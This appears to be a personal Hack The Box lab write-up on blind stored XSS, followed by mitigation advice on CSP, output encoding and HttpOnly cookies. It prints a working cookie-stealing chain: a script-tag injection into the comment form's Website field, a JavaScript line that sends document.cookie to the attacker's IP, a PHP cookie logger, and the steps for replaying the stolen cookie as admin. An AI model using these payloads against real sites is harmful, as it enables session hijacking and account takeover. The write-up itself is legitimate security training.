# HTB-Writeup-CrossSiteScripting

Exploited XSS to deploy payloads within privileged execution contexts, revealing input validation vulnerabilities and advocating CSP enforcement, output sanitization, and secure cookie implementation.

By Ramyar Daneshgar

## Objective

The goal of this assessment was to identify and exploit vulnerabilities in a web application, focusing on Cross-Site Scripting (XSS) attacks. Using blind XSS techniques, I demonstrated how inadequate input validation, improper cookie configurations, and weak output encoding could be exploited to execute malicious scripts within an administrator's browser. This allowed unauthorized access to sensitive application resources. This report details the exploitation process, tools, and methods used while highlighting actionable insights to strengthen defenses against XSS vulnerabilities.

---


## Tools and Setup

- **Browser Developer Tools**: Used to inspect responses, manipulate cookies, and debug injected payloads.
- **Burp Suite**: Intercepted and modified HTTP requests for testing payloads.
- **Netcat (`nc`)**: Set up to listen for HTTP requests and confirm execution of injected scripts.
- **PHP Development Server**: Hosted malicious scripts to exfiltrate cookies.
- **Pwnbox Environment**: Parrot Linux instance provided by Hack The Box.

---

## Step-by-Step Exploitation

### Step 1: Reconnaissance and Input Testing

#### Initial Analysis
I accessed the `/assessment` page and identified a blog-like structure with a comment submission form containing the following input fields:
1. **Name**
2. **Email**
3. **Website**
4. **Comment**

The note "comments must be approved by an admin" suggested that inputs submitted via the form would be processed or rendered in the admin's browser, making this an ideal scenario for blind XSS exploitation.

#### Payload Testing
I tested each input field by submitting the following basic XSS payload:
```html
'><script src="http://PWNIP:PWNPO/test.js"></script>
```

#### Monitoring Results
I set up a **Netcat listener** to monitor for incoming HTTP requests:
```bash
nc -nvlp 9001
```

I observed the following:
- **Name and Email Fields**: Inputs were sanitized or not reflected in any HTTP request or response.
- **Website Field**: Triggered an HTTP request to the Netcat listener. This confirmed that the Website field was vulnerable to stored or blind XSS.

---

### Step 2: Crafting a Malicious Payload

#### Objective
Leverage the vulnerable Website field to execute a malicious JavaScript payload in the admin's browser. The payload should steal the admin's cookies and send them to my controlled server.

#### Payload Construction
I created the following JavaScript payload, which uses the `Image` object to make an HTTP GET request to my server, appending the victim's cookies as a query parameter:
```javascript
new Image().src = 'http://10.10.14.41:9001/index.php?c=' + document.cookie;
```

This approach ensures that:
1. The request is inconspicuous, as it mimics a typical resource load.
2. Cookies are exfiltrated without causing visible errors in the browser.

---

### Step 3: Setting Up a Malicious Server

#### Hosting the Exploit
I set up a **PHP development server** to host the malicious payload and capture cookies. Here’s how I configured it:

1. **Created a `script.js` file** containing the payload:
   ```bash
   echo "new Image().src = 'http://10.10.14.41:9001/index.php?c=' + document.cookie;" > script.js
   ```

2. **Developed a PHP script (`index.php`)** to log incoming cookies:
   ```php
   <?php
   if (isset($_GET['c'])) {
       $list = explode(";", $_GET['c']);
       foreach ($list as $cookie) {
           $file = fopen("cookies.txt", "a+");
           fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
           fclose($file);
       }
   }
   ?>
   ```

3. **Started the PHP server** in the same directory as `script.js` and `index.php`:
   ```bash
   php -S 0.0.0.0:9001
   ```

---

### Step 4: Injecting the Payload

With the malicious server running, I injected the following payload into the vulnerable Website field of the comment form:
```html
'><script src="http://10.10.14.41:9001/script.js"></script>
```

Upon submission, the payload was stored in the application and subsequently executed when the admin viewed the comment in their browser.

---

### Step 5: Monitoring and Capturing the Flag

#### Monitoring Execution
I monitored the PHP server logs for incoming requests. When the admin loaded the malicious comment, their browser executed the injected script (`script.js`), which sent their cookies to my server. The following request was captured:
```
GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check; flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

#### Extracting the Flag
The `flag` cookie value was successfully extracted and logged:
```
Victim IP: 10.129.43.173 | Cookie: flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

### Step 6: Using the Stolen Cookie

To leverage the stolen session cookie:
1. Opened **Browser Developer Tools** → Application → Cookies.
2. Manually injected the stolen `flag` cookie:
   ```
   flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
   ```
3. Refreshed the `/assessment` page, successfully gaining admin access.

---

## Lessons Learned

### 1. Input Validation and Output Encoding
The root cause of this vulnerability was the lack of input validation and output encoding. The application failed to:
- Validate user inputs for potentially harmful characters like `<` or `>`.
- Properly encode reflected data to prevent script execution.

### 2. Content Security Policy (CSP)
The absence of a robust CSP allowed the application to execute external scripts. A CSP could have restricted the execution of scripts to trusted sources.

### 3. Blind XSS Risks
Blind XSS is particularly dangerous because it targets privileged users, such as administrators, and often operates silently. This vulnerability could have been detected and mitigated through proper input sanitization and robust logging mechanisms.

### 4. Cookie Security
The `flag` cookie was accessible via JavaScript, as it lacked the `HttpOnly` attribute. Properly configured cookies (`HttpOnly`, `Secure`) would have prevented this attack.

---

## Recommendations for Mitigation

1. **Input Validation**:
   - Use a whitelist approach to validate user inputs, rejecting any disallowed characters or patterns.
   - Implement server-side validation in addition to client-side checks.

2. **Output Encoding**:
   - Encode all user inputs when reflecting them in HTML or JavaScript contexts. For example, replace `<` with `&lt;`.

3. **Content Security Policy (CSP)**:
   - Deploy a strict CSP to prevent the execution of scripts from untrusted sources.

4. **Cookie Security**:
   - Mark sensitive cookies as `HttpOnly` and `Secure` to prevent access via JavaScript and enforce transport encryption.

5. **Regular Penetration Testing**:
   - Perform routine security assessments to identify and patch vulnerabilities before they can be exploited.

---

## Conclusion  

The findings from this lab highlighted the importance of mplementing strict input validation, content security policies, and secure cookie attributes. Regular security testing and a defense-in-depth strategy are critical to reducing the attack surface and mitigating risks associated with Cross Site Scripting vulnerabilties. 
